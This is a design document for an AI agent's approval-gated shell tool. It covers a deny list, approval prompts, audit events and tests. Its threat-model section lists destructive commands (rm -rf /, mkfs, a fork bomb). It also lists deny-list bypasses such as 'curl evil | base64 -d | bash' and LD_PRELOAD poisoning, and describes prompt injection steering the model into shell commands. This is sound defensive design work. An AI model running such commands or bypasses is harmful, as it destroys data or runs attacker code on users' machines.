# Phase 4.7 — `project_shell`: Design

## Overview

One inline tool, one new deny-pattern batch, one new event kind,
one boot-time interpreter probe, one CLI flag. No new primitives
— the whole phase composes existing Phase 4 / 4.5 machinery.

```
  model → project_shell(project, command)
            │
            ▼
  ┌──────────────────────────────────┐
  │ approval middleware              │
  │   ├ deny-list check (existing)   │
  │   │    via tool.shell_command_for│
  │   ├ bucket resolution            │
  │   │    per-client / per-session  │
  │   └ ask flow via Telegram / IDE  │
  └──────────────────────────────────┘
            │                (reject → ApprovalDecision.rejected;
            │ approve         tool_executed NOT emitted)
            ▼
  ExecutionBackend.run_shell
     (hub-local: bash -lc "<command>"
      ssh:       ssh host 'cd path && <command>')
            │
            ▼
  ┌──────────────────────────────────┐
  │ audit.jsonl                       │  (HMAC-chained, existing)
  └──────────────────────────────────┘
            │
            ▼
  EventLog.append(tool_executed)
            │
            ▼
  TelegramPush (existing subscriber)
```

Three principles.

1. **Deny list is the floor, not the ceiling.** We don't ship a
   "safe command classifier." The list catches obvious
   catastrophes; everything else lands in the `ask` bucket and a
   human decides. This is how `approval.py` already works —
   we're the first consumer actually using its `shell_command_for`
   hook.

2. **Approval prompt shows the real command.** The existing
   `_summarise_args` caps at ~200 chars because most tools
   have trivially-long args that don't belong on a phone
   screen. `project_shell` is the exception: the whole value
   is the command string and the user must see it to decide.
   So we widen the cap for this tool specifically, to 1000
   chars. Beyond 1000, we truncate and flag — because a 10KB
   shell command is a prompt-injection smell.

3. **Events mirror execution, not intent.** `tool_executed`
   fires only after a successful dispatch (approved + ran to
   termination, regardless of exit code). A rejected approval
   doesn't emit one (the audit log records the rejection;
   that's enough). A deny-list-blocked command doesn't emit
   one (same — audit has it). This keeps the event stream
   matched to "things that actually happened on the box."

## Architecture

### The tool

```python
# gateway/src/gateway/tools/project_shell.py

def build_project_shell_tool(
    *,
    backend: ExecutionBackend,
    events: EventLog,
    local_shell_probe: LocalShellProbe,
) -> Tool:
    return Tool(
        name="project_shell",
        description=(
            "Execute a shell command in a registered project. "
            "The command runs under bash -lc locally or via ssh on "
            "satellites. Pipes, globs, redirection, and command "
            "chaining all work. Interactive commands (vim, sudo) "
            "hang until timeout — do not use them. Background "
            "processes (trailing &) block the tool on their stdout; "
            "fire-and-forget use ' </dev/null >/dev/null 2>&1 &' "
            "pattern explicitly or run under nohup via a wrapper "
            "script checked into the repo."
        ),
        schema={
            "type": "object",
            "properties": {
                "project": {"type": "string"},
                "command": {"type": "string"},
                "timeout_secs": {"type": "integer", "default": 120},
            },
            "required": ["project", "command"],
            "additionalProperties": False,
        },
        callable=_impl,
        default_bucket=ApprovalBucket.ASK,
        requires_project=True,
        shell_command_for=lambda args: args.get("command"),
    )
```

`shell_command_for` is the existing hook in `_types.py` —
`approval.py` reads it before bucket resolution and runs the
deny list against the returned string. We're the first tool
to use it.

`_impl` does three things:
1. Look up the project.
2. Build the argv (`bash -lc <cmd>` for local,
   `ssh <host> 'cd <path> && <cmd>'` for remote — the latter
   is already what `ExecutionBackend` does).
3. Call `ExecutionBackend.run_shell`, shape the result into a
   `ToolResult`, emit the `tool_executed` event.

### Shell dispatch on Windows hubs

`ExecutionBackend.run_shell` today passes `cmd: list[str]`
directly to `asyncio.create_subprocess_exec`. For
`project_shell` the argv needs to become:

- Linux/macOS hub: `["bash", "-lc", command]`
- Windows hub w/ Git Bash: `[r"C:\Program Files\Git\bin\bash.exe", "-lc", command]`
- Windows hub w/ WSL: `["wsl", "--", "bash", "-lc", command]`
- Windows hub without either: tool fails with a readable
  error at invocation time.

We add a small `LocalShellProbe` helper that resolves the
right invocation at gateway boot and caches it. The probe
runs a trivial `echo probe` under each candidate; first
success wins. The `project_shell` tool reads the probe result
when shaping its argv. Nothing else in the gateway needs to
know about this — tests and other tools still use the argv
form `run_shell` was built for.

```python
@dataclass(frozen=True, slots=True)
class ShellInterpreter:
    argv_prefix: list[str]      # ["bash", "-lc"] or ["wsl", "--", "bash", "-lc"]
    label: str                   # "bash" / "git-bash" / "wsl" / "none"
    probed_path: str | None      # for logging; None when the prefix is PATH-resolved

class LocalShellProbe:
    async def detect(self) -> ShellInterpreter: ...
```

Probe result is attached to `app.state.local_shell` at startup.
The test harness creates a fake probe returning `bash` so e2e
tests don't depend on the host.

SSH path stays untouched: `_build_ssh_argv` already builds
`ssh <host> 'cd <path> && <cmd>'` where `<cmd>` is the
POSIX-shell-joined `cmd` argv. For `project_shell` we pass
`cmd=[command]` and wrap at the callsite as `bash -lc`:
remote side's login shell is what gets invoked, which is
what we want anyway.

### Approval prompt widening

`approval._summarise_args` hardcodes a 200-char cap on the
whole summary. For `project_shell` we want the `command`
value visible up to 1000 chars — anything shorter loses the
content the user needs to approve.

Two options:
- **(A)** Special-case the tool name in `_summarise_args`.
- **(B)** Add a `summary_hint` to the `Tool` dataclass; per-tool
  summarisers override the default.

Going with (A) for v0. The hardcoded branch lives inside
`approval.py` and reads `tool.name == "project_shell"`. This
is the smallest possible surface: no new dataclass fields, no
new plugin hook. If a second tool needs a per-tool summary
later, we upgrade to (B) then. v0 keeps the knob invisible
because YAGNI.

### The `tool_executed` event

```python
# kind: tool_executed
# session_key: same session as the chat turn
# title: "ran project_shell on <project>"
# body: stdout + stderr, capped via events.telegram_body_cap
# meta: {
#   "tool": "project_shell",
#   "project": "hub",
#   "command": "<up to 1000 chars>",
#   "exit_code": 0,
#   "duration_ms": 123,
#   "timed_out": false,
# }
```

New kind; no taxonomy change (Phase 4.5's event log is
extensible per-phase). Telegram push formatter gets a new
branch: prefix with `▶` (running / ran) — matches the
Telegram-push-formatter pattern for other async events.

### Per-client policy defaults

`ToolPolicy.from_config` parses `tools:` in `config.yaml`
today. Defaults for per-client buckets live in the registry's
bucket table. For `project_shell` we want the defaults even
when the operator hasn't written any `tools:` block — so we
bake them into the tool's registration:

```python
# in app.py create_app:
tool_registry.register(
    build_project_shell_tool(...),
    per_client_defaults={
        "cli": ApprovalBucket.ASK,
        "telegram": ApprovalBucket.ASK,
        "ide": ApprovalBucket.ASK,
        "webui": ApprovalBucket.BLOCK,
    },
)
```

`ToolRegistry.register` gains an optional `per_client_defaults`
kwarg. `resolve_bucket` already walks: per-call policy →
per-tool policy → per-client default → tool default. We
inject into layer 3. Operator config (`tools.per_client`)
still overrides.

This is the minimal change to the registry: the existing
resolve chain keeps its shape; we're just not relying on
"all tools default to same fallback." A future tool with a
different per-client posture can set its own defaults the
same way.

## Threat model

### What v0 protects against

- **Operator mistakes.** Drunk-operator typos like
  "clear my project" rendered as `rm -rf /` — the deny list
  catches the canonical forms (`rm -rf /`, `rm -rf $HOME`,
  `rm -rf ~`, `rm -rf .git`).
- **Well-known destruction patterns.** `mkfs.*`,
  `dd of=/dev/sd*`, `git push --force`, `git reset --hard
  origin`, `:(){ :|:& };:`, `shutdown -h`, `reboot -f`,
  `DROP DATABASE`, `aws s3 rb --force`, `docker prune
  --volumes --all`, plus the new FITT-specific additions
  (`rm -rf $FITT_HOME`, `rm -rf $HOME/.fitt`, `git clean -fdx`).
- **Model typos on documented-catastrophic forms.** Same
  coverage as above.
- **Accidental approval.** The full command reaches the phone
  at up-to-1000-char display. A user who's paying attention
  won't tap approve on something obviously destructive they
  didn't ask for.

### What v0 does NOT protect against

- **A compromised model.** If the model itself decides to be
  destructive, it has every approved tool call as its
  cooperating surface. Our approval is cooperative, not
  adversarial.
- **Prompt injection via absorbed context.** A malicious
  string in a web page, document, RSS item, or cron-pulled
  source that convinces the model to run something nasty.
  The deny list fires on the literal command, so
  `curl evil | bash` is caught; `curl evil | base64 -d |
  bash`, `eval "$(curl evil)"`, `python -c
  'import os; os.system(...)'`, `bash -c "$(echo base64 | base64 -d)"`
  are NOT.
- **Environment poisoning.** `export LD_PRELOAD=...` (or
  `PATH=/tmp:$PATH`, or `HISTFILE=/dev/null`, or ...) doesn't
  look like a command and is not in the deny list. The
  approver sees a setenv; the next approved "ls" is a
  different ls.
- **Filesystem damage outside the deny-listed paths.**
  `rm -rf /etc` is not in the list (not common enough to add
  a pattern for; a lot of false positives for benign
  `/etc/hosts` edits). `chmod -R 000 $HOME/my-project` is
  not caught. Operators who want these covered file a PR
  against `deny_list.py`.
- **Supply-chain attacks.** `pip install malicious-pkg`,
  `npm install malicious-pkg`, `brew install X` — nothing
  in the deny list. We don't audit package registries.
- **Resource exhaustion.** `:(){ :|:& };:` is caught (fork
  bomb); `while true; do echo x; done > /tmp/bigfile` is
  not (disk fill).

### One-sentence summary

*Phase 4.7 protects against operator mistakes and well-known
destructive patterns; it does not protect against a
compromised model or prompt-injection-borne commands at any
point past the approval prompt. Do not enable `trust_session`
for `project_shell` in sessions whose input channel might
carry attacker-controlled content until sandboxing ships.*

## Non-goals

- **No allowlist.** The "pin a list of safe commands" model
  fails on compound commands
  (`cd /repo && git fetch && git log | head`) because the
  classifier sees the whole string. Settings drift — every
  "always allow" click adds a new entry — makes the allowlist
  reconverge on the broken state. Deny list is the primitive;
  allowlist is abandoned. *Addressed elsewhere:* `auto` bucket
  per-client-per-tool already gives operators the knob they'd
  actually want.
- **No pattern-based safe-command classifier.** Cursor's 2026
  CVE showed that command-string classifiers can't capture
  execution context (env-var poisoning). Our deny list is
  deliberately narrow and we document that narrowness.
  *Addressed elsewhere:* `ask` bucket + the approval prompt.
- **No sandbox in v0.** Sandbox is the correct long-term
  answer but it's OS-specific (Landlock + seccomp on Linux,
  Seatbelt on macOS, WSL2 on Windows). *Addressed elsewhere:*
  Phase 7+ sandbox item.
- **No interactive commands.** `BatchMode=yes` already on for
  SSH; locally no TTY. `vim`, `sudo` with password prompt,
  anything wanting a pty hangs and times out. *Addressed
  elsewhere:* the tool description tells the model not to
  try; timeouts cap the damage.
- **No background processes.** `communicate()` waits for EOF
  on stdout/stderr. A daemon detached with `&` keeps the tool
  blocked for the full timeout. *Addressed elsewhere:* if the
  user wants a long-running daemon, they don't want it
  through FITT.

## Module layout

```
gateway/src/gateway/tools/
  project_shell.py       ← new
  deny_list.py           ← new patterns added
  local_shell.py         ← new; LocalShellProbe + ShellInterpreter
  _types.py              ← unchanged (shell_command_for hook already there)
gateway/src/gateway/
  approval.py            ← widen args_summary cap for project_shell
  app.py                 ← wire probe, register tool with per-client defaults
  cli.py                 ← fitt audit tail -f
telegram-bot/src/fitt_telegram_bot/
  events_push.py         ← format tool_executed
gateway/tests/
  test_project_shell.py  ← new
  test_local_shell.py    ← new
  test_deny_list.py      ← extend with new patterns
  test_approval.py       ← widen-cap test for project_shell
  e2e/test_project_shell_lifecycle.py  ← new lifecycle test
telegram-bot/tests/
  test_events_push.py    ← extend with tool_executed
```

## Configuration

### `config.yaml` (optional per-project; defaults shipped)

```yaml
tools:
  per_client:
    webui:
      project_shell: block       # already the baked-in default; operators can
                                 # leave it out and it stays blocked
    ide:
      project_shell: trust_session  # opt-in to Continue-style flow
```

No new top-level `shell:` or `project_shell:` block. The tool
is a normal registered tool; config follows existing shapes.

### `secrets.yaml`

No changes.

## Tests

### Unit

- `test_project_shell.py`:
  - schema validation (missing project, missing command, wrong types).
  - local dispatch builds the right `bash -lc` argv.
  - SSH dispatch delegates to `ExecutionBackend` unchanged
    (backend is mocked; assert it received the expected argv).
  - `tool_executed` event lands on success; meta carries
    exit code + duration + command.
  - `tool_executed` event lands on timeout, with
    `timed_out=true`.
  - tool fails cleanly when the local shell probe resolved to
    "none" (no bash / WSL / Git Bash).
- `test_local_shell.py`:
  - probe resolves to `bash` when `echo probe` via `bash -lc`
    succeeds.
  - probe resolves to `git-bash` when bash fails but the
    Git-Bash absolute path succeeds (monkeypatched subprocess).
  - probe resolves to `wsl` when only `wsl -- bash -lc` works.
  - probe resolves to `none` when all candidates fail.
- `test_deny_list.py`:
  - positive test for each new pattern (`rm -rf $FITT_HOME`,
    `rm -rf $HOME/.fitt`, `git clean -fdx`).
  - negative test each (benign-looking siblings:
    `FITT_HOME=... cmd`, `git clean --dry-run`, etc.).
- `test_approval.py`:
  - `project_shell` args_summary shows up to 1000 chars of
    command.
  - 1001+ chars → truncation marker appears.
  - other tools still use the 200-char cap.

### E2E (harness from Phase 4.6)

`test_project_shell_lifecycle.py`:
1. Stubbed LLM emits `project_shell` tool call with
   `command="echo hello"`.
2. `e2e_approver.start(approve_if_tool("project_shell"))`.
3. POST chat; tool runs; LLM wraps up with a reply.
4. Assert `tool_executed` event in `/v1/events` with
   `meta.command == "echo hello"` and `meta.exit_code == 0`.
5. Rejected path: approver rejects; assert NO `tool_executed`
   event (audit trail has the rejection; event log stays
   clean per P3 from design principles).

### CLI (`fitt audit tail -f`)

`test_cli_audit_tail_follow.py` (extends
`test_cli.py`-shape):
- Spawn the command against a temp audit file; append two
  entries after a short delay; assert both appear in the
  output; Ctrl-C-equivalent (send SIGTERM) exits cleanly.
- Filters pass through (`--tool=project_shell` filters out
  other tool entries when tailing).

## Rollout

Implementation order:

1. `local_shell.py` (probe) + tests. Standalone, no other
   refactors depend on it.
2. Deny-list additions + tests.
3. `project_shell.py` (tool) + unit tests. Uses the probe
   from step 1.
4. Widen `args_summary` for `project_shell` in `approval.py`
   + test.
5. `tool_executed` event kind: new kind in EventLog taxonomy,
   Telegram push formatter, event emission inside tool's `_impl`.
6. Wire in `app.py`: register tool with per-client defaults,
   attach probe to `app.state.local_shell`.
7. Register telegram-bot formatter; extend
   `telegram-bot/tests/test_events_push.py`.
8. E2E lifecycle test (`tests/e2e/test_project_shell_lifecycle.py`).
9. `fitt audit tail -f`.
10. Docs / roadmap pointer update.

Each step commits separately so a reviewer can see the tool
build up layer by layer.

## Open design decisions

1. **Default `timeout_secs`.** 120s by v0. Long enough for
   `npm install` on a small repo; short enough that an
   interactive-command mistake is bounded. Operators who
   need longer pass `timeout_secs=300` per call.
2. **Whether to truncate stdout/stderr in the tool result.**
   Today: no — the model gets the full output (the
   execution-backend already decodes `errors="replace"` so a
   giant binary won't crash). The Telegram event-body is
   capped separately via `events.telegram_body_cap`. If the
   full output destabilises the model's reasoning (context
   length), we cap at the tool layer later.
3. **Whether a rejected approval emits a user-facing
   event.** Today: no. The chat handler returns the
   rejection to the model; the model's final reply is what
   the user sees. The audit log has the forensic trail. If
   operators miss "the agent tried X and I said no" in the
   event stream, add a `tool_rejected` event in a future
   phase.
4. **Whether to allowlist a `trust_session` for any client
   by default.** No. Every new client has to opt in
   explicitly via config. The blast radius of a wrong
   default here is "shell execution without human in the
   loop for hours" — we're not guessing.
5. **Telegram push body format for `tool_executed`.** v0
   renders `▶ ran project_shell: <command-truncated-30>`
   as the title and stdout/stderr as the body. If stdout is
   empty, show a dim "(no output)" marker rather than an
   empty message. Pins in the bot test.

## Correctness properties

- **P1.** Every approved `project_shell` invocation produces
  exactly one `tool_executed` event.
- **P2.** A rejected or deny-listed `project_shell` call
  produces zero `tool_executed` events and exactly one audit
  entry.
- **P3.** The approval prompt's `args_summary` contains the
  first 1000 chars of the command verbatim; longer commands
  are truncated with a flagged marker.
- **P4.** `LocalShellProbe.detect()` is idempotent — the
  result is cached on `app.state` for the process's
  lifetime; subsequent invocations don't respawn
  subprocesses.
- **P5.** On a hub without a resolvable POSIX shell, the
  tool's local path fails with a readable error; the SSH
  path still works for remote projects.
- **P6.** Deny-list additions have both a positive and a
  negative test (U3.2).
